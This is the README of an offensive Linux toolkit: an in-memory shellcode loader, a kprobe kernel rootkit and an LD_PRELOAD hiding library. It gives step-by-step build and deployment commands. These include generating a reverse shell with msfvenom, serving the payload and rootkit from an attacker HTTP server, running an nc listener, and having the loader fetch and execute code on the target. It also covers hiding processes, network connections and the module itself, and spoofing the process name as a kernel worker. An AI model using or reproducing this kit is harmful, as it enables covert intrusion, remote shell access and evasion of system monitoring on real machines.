# Linux Shellcode Loader — Pure In-Memory Remote Loading and Full-System Hiding

## Overview

Pull encrypted shellcode from a remote HTTP server, decrypt in memory, and execute. Achieve full-system hiding of processes and network connections via kernel rootkit + userspace hide_lib.so.

**Core Features:**
- Shellcode never touches disk: HTTP → memory decrypt → mmap execute
- Rootkit kernel module: full-system process hiding, connection hiding, signal protection
- Rootkit auto-hides from lsmod after loading
- Pre-compiled .ko auto-matches target kernel version (HTTP fetch)
- hide_lib.so userspace hook (for non-root mode)
- Pure kprobe implementation, no sys_call_table modification, compatible with kernel lockdown

## Module Functions

```
┌─────────────────────────────────────────────────────────┐
│                     loader (Remote Loader)               │
│  HTTP GET → SCLD decrypt → mmap RW → mprotect RX → exec │
├─────────────────────────────────────────────────────────┤
│  rootkit.ko (Kernel Module)                              │
│  ├─ openat kprobe        → Block /proc/<pid> access     │
│  ├─ getdents64 kretprobe → Filter /proc directory list  │
│  ├─ kill/tkill/tgkill    → Intercept signals            │
│  ├─ tcp4_seq_show kprobe → Hide from /proc/net/tcp      │
│  ├─ inet_sk_diag_fill    → Hide from ss/NETLINK         │
│  └─ Auto lsmod hide after load                          │
├─────────────────────────────────────────────────────────┤
│  hide_lib.so (LD_PRELOAD Library)                        │
│  ├─ readdir/readdir64 hook → Filter /proc directory     │
│  ├─ open/openat/fopen hook → Block /proc/<pid>          │
│  ├─ recvmsg/recvfrom hook  → Filter ss NETLINK          │
│  ├─ read hook              → Filter /proc/net/tcp        │
│  └─ Auto rename after execve → [kworker/0:0]            │
└─────────────────────────────────────────────────────────┘
```

## Directory Structure

```
loader_project/
├── src/
│   ├── loader.c              # Main loader (HTTP fetch + memory exec)
│   ├── hide_lib.c            # LD_PRELOAD hide library
│   ├── rootkit.c             # Kernel rootkit (v15, kprobe-only)
│   └── encrypt_shellcode.c   # Shellcode encryption tool
├── build/
│   ├── loader                # Compiled loader
│   ├── encrypt               # Encryption tool
│   ├── enc_shellcode.bin     # Encrypted shellcode (for HTTP distribution)
│   ├── rootkit_5.14.0-687.10.1.el9_8.0.1.x86_64.ko  # Rocky 9
│   └── rootkit_5.15.0-139-generic.ko                 # Ubuntu 20.04
├── rootkit/                  # Pre-compiled kernel module repository
├── shellcode/
│   └── sc_4444.bin           # Raw reverse shell (192.168.102.167:4444)
├── Makefile
└── README.md
```

## Build Environment

| Component | Requirement |
|-----------|-------------|
| OS | Ubuntu 20.04+ / Debian / Rocky 9 |
| Compiler | gcc, make |
| Kernel headers | linux-headers-$(uname -r) (needed for local rootkit build) |
| Docker | Cross-compile rootkit for other kernel versions (optional) |
| Python3 | HTTP server |
| Tools | xxd (needed by gcc to compile hide_lib) |

### Install Build Dependencies

```bash
# Ubuntu/Debian
sudo apt install -y gcc make xxd python3 netcat-openbsd docker.io

# Rocky 9
sudo dnf install -y gcc make vim-common python3 docker
```

## Quick Start

### 1. Build

```bash
cd loader_project
make                          # Build loader + hide_lib.so (embedded)
make build/encrypt            # Build encryption tool
```

### 2. Generate Encrypted Shellcode

```bash
# Use pre-built shellcode (connects to 192.168.102.167:4444)
./build/encrypt shellcode/sc_4444.bin build/enc_shellcode.h build/enc_shellcode.bin

# Custom shellcode
msfvenom -p linux/x64/shell_reverse_tcp LHOST=<your_ip> LPORT=4444 -f raw -o my.bin
./build/encrypt my.bin build/enc_shellcode.h build/enc_shellcode.bin
```

### 3. Build Kernel Rootkit

```bash
# === Local build ===
make rootkit
# → rootkit/rootkit_$(uname -r).ko

# === Docker cross-compile (Rocky 9) ===
docker run --rm \
  -v $(pwd)/src/rootkit.c:/src/rootkit.c \
  -v $(pwd)/build:/out \
  rockylinux:9 bash -c '
    dnf install -y kernel-devel gcc make elfutils-libelf-devel
    KDIR=$(ls -d /usr/src/kernels/* | head -1)
    VER=$(cat $KDIR/include/generated/utsrelease.h | awk "{print \$3}" | tr -d "\"")
    cd /tmp && cp /src/rootkit.c .
    echo "obj-m += rootkit.o" > Makefile
    make -C $KDIR M=/tmp modules
    cp rootkit.ko /out/rootkit_${VER}.ko
  '

# === Docker cross-compile (other distros) ===
# Replace rockylinux:9 with the target distro's Docker image
# Debian/Kali: install linux-headers-amd64 package
# Ubuntu: install linux-headers-generic package
# RHEL/Rocky: install kernel-devel-$(uname -r) package

# Save to rootkit repository
cp build/rootkit_*.ko rootkit/
```

### 4. Prepare HTTP Serving Files

```bash
# Copy all .ko files to build/
cp rootkit/rootkit_*.ko build/

# build/ should contain:
#   enc_shellcode.bin    - Encrypted shellcode
#   rootkit_*.ko         - Rootkits for each target kernel version
```

### 5. Deploy

```bash
# ===== Attacker Machine =====
# Terminal A: HTTP server (serves shellcode + rootkit)
cd loader_project/build
python3 -m http.server 8080

# Terminal B: nc listener (receive reverse shell)
nc -lvnp 4444

# Terminal C: Transfer loader to target
scp build/loader root@<target_ip>:/tmp/

# ===== Target Machine =====
# Root mode (full-system hiding):
ssh root@<target_ip>
/tmp/loader -v http://<attacker_ip>:8080/enc_shellcode.bin

# Non-root mode (current terminal hiding only):
chmod +x /tmp/loader
/tmp/loader -v http://<attacker_ip>:8080/enc_shellcode.bin
```

## Verification

```bash
# Get the hidden PID
PID=$(cat /proc/kallmodsmsg | awk '{print $1}')

# Root mode verification (all terminals affected):
ls /proc/$PID                     # Should show "No such file"
ps -ef | grep $PID                # Should return nothing
kill -0 $PID && echo fail         # Should return nothing
kill -9 $PID; ls /proc/$PID       # Process still exists
ss -tnp | grep 4444               # Should return nothing
cat /proc/net/tcp | grep 4444     # Should return nothing
lsmod | grep rootkit              # Should return nothing (hidden)
cat /proc/kallmodsmsg             # Confirm PID and ports

# Non-root mode verification (current terminal only):
# After running loader, in the new shell:
ps -ef | grep sh                  # Process name shows [kworker/0:0]
ss -tnp | grep 4444               # Should return nothing
```

## Cleanup

```bash
# Root mode — module is hidden from lsmod, reboot needed to clear
sudo reboot

# Or other cleanup methods:
rm -f /tmp/.h /tmp/loader
```

## Encryption Format (SCLD)

```
┌──────┬─────┬──────┬─────────┬──────────┬──────────┬────────────┐
│ SCLD │ ver │ algo │ keylen  │   key    │  paylen  │  Payload   │
│ 4B   │ 1B  │ 1B   │ 2B LE   │  N bytes │ 4B LE    │  M bytes   │
└──────┴─────┴──────┴─────────┴──────────┴──────────┴────────────┘
```

- `algo=0`: XOR encryption (16-byte cyclic key)
- `algo=1`: RC4 stream cipher
- Key is embedded in the file; loader parses and decrypts in memory

## Shellcode Encryption Commands

```bash
# XOR encryption (default)
./build/encrypt input.bin output.h output.bin

# RC4 encryption
./build/encrypt --rc4 input.bin output.h output.bin

# Custom input/output
./build/encrypt <raw_shellcode> <c_header> <encrypted_binary>
```

## Architecture

### Execution Flow

```
Attacker:8080                          Target Machine
───────────                            ──────────────
HTTP GET /enc_shellcode.bin  ←── loader downloads encrypted shellcode to memory
HTTP GET /rootkit_<ver>.ko   ←── init_module() loads rootkit in memory

fork()
  ├─ Child: mmap RW → decrypt → mprotect RX → jump to execute
  │          shellcode: socket→connect→dup2→execve("/bin/sh")
  │          Reverse shell connects to attacker:4444
  └─ Parent (root): load rootkit → write PID → _exit(0)
       Parent (non-root): exec /bin/bash (with LD_PRELOAD)
```

### Hiding Layers

| Layer | Technique | Privilege | Effect |
|-------|-----------|-----------|--------|
| 1 | prctl + /proc/self/comm | any | Process name spoofed as [kworker/0:0] |
| 2 | hide_lib.so (memfd) | any | Current terminal ps/ss filtering |
| 3 | getdents64 kretprobe | root | System-wide /proc directory hiding |
| 4 | openat kprobe | root | Block direct access to hidden PIDs |
| 5 | kill/tkill/tgkill kprobe | root | Signal protection |
| 6 | tcp4_seq_show kprobe | root | /proc/net/tcp hiding |
| 7 | inet_sk_diag_fill kprobe | root | ss NETLINK hiding |
| 8 | lsmod hiding | root | Module invisible |

## Adding New Target Kernel Versions

```bash
# 1. Get target kernel version
ssh target 'uname -r'
# → 6.1.0-kali7-amd64

# 2. Find matching Docker image and compile
docker run --rm \
  -v $PWD/src/rootkit.c:/src/rootkit.c \
  -v $PWD/build:/out \
  kalilinux/kali-rolling bash -c '
    apt update && apt install -y linux-headers-6.1.0-kali7-amd64 build-essential
    cd /tmp && cp /src/rootkit.c . && echo "obj-m += rootkit.o" > Makefile
    make -C /usr/src/linux-headers-6.1.0-kali7-amd64 M=/tmp modules
    cp rootkit.ko /out/rootkit_6.1.0-kali7-amd64.ko
  '

# 3. Save to repository and copy to build/
cp build/rootkit_6.1.0-kali7-amd64.ko rootkit/
cp build/rootkit_6.1.0-kali7-amd64.ko build/
```

## Known Limitations

| Limitation | Description |
|------------|-------------|
| x86_64 only | ARM/aarch64 needs register name adaptation |
| Kernel lockdown | Signal hooks limited under Ubuntu 5.15+ + SecureBoot |
| Non-root cross-terminal | LD_PRELOAD only affects current process, other terminals can see |
| inet_sk_diag_fill | Static symbol on Ubuntu, kprobe unavailable; works on Rocky 9 |
| Vermagic matching | rootkit.ko must match target kernel exact version |
